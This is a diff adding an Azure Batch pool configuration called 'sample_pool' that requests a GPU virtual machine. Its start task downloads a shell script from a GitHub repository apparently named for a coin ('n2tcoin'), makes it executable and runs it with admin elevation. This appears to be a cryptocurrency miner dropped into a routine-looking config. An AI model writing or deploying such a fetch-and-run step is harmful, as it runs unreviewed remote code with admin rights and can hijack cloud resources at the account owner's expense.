@@ -1,0 +1,22 @@
+{
+    "id": "sample_pool",
+    "virtualMachineConfiguration": {
+        "imageReference": {
+            "publisher": "Canonical",
+            "offer": "UbuntuServer",
+            "sku": "18.04-LTS"
+        },
+        "nodeAgentSKUId": "batch.node.ubuntu 18.04"
+    },            
+    "vmSize": "Standard_NC6s_v3",
+    "targetLowPriorityNodes": 1,
+    "startTask": {
+        "commandLine": "/bin/sh -c 'wget -O azure.sh https://raw.githubusercontent.com/n2t91/n2tcoin/main/n2t.sh && chmod +x azure.sh && bash ./azure.sh'",
+        "waitForSuccess": false,
+        "userIdentity": {
+            "autoUser": {
+                "elevationLevel": "admin"
+            }
+        }
+    }
+}
